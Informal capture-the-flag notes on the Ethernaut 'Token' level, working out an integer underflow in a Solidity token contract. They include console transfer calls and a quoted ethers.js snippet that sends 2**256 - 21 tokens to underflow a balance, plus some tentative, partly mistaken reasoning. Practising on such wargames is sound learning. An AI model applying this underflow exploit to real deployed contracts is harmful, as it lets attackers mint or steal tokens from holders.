5 - Token
=========

New Stuff
---------
* `require`

* The constructor caller gets all the tokens.
* At instance creation we get 20 tokens?
* Could I cause an integer overflow?

Yes!
[1](https://ethereum.stackexchange.com/a/7294)
Note: won't work for solidity v0.8.0+.

Even though the overflow could be possible, the -= then += would probably cancel it out?
`20 - 25 = -5 -> 2**256 - 5`
`2**256 - 5 + 25 = 20`

Possibly 'spoof' the `message.sender`?
[2](https://ethereum.stackexchange.com/a/68922)
-> Only for view functions

```
await contract.balanceOf(player)
await contract.transfer(player, 999999, {from: player})
await contract.transfer(player, 20, {from: player})
await contract.totalSupply()
```

Can I create a new account to transfer the overflowing funds to?

1. MetaMask: Create new account
2. [Faucet](https://rinkebyfaucet.com/)

```
player2='<Second Address>'
await contract.balanceOf(player2)
await contract.transfer(player2, 10, {from: player})
await contract.transfer(player2, 30, {from: player})
```

Couldn't get MetaMask to work with both accounts at the same time... ?

But still managed to do something strange with the 2 accounts?
* I did a few transfers of ~30 tokens in both directions?

> Not really sure what caused the overflow / 30 tokens to appear...

Overflowing WAS the solution!

[3](https://cmichel.io/ethernaut-solutions/)
```
const [eoa, accomplice] = await ethers.getSigners();
const eoaAddress = await eoa.getAddress();
// contract uses unsigned integer which is always >= 0, overflow check is useless
tx = await challenge.connect(accomplice)
    // we start with 20 tokens, make sure eoa's balance doesn't overflow as well
    .transfer(eoaAddress, BigNumber.from(`2`).pow(256).sub(`21`));
await tx.wait();
```
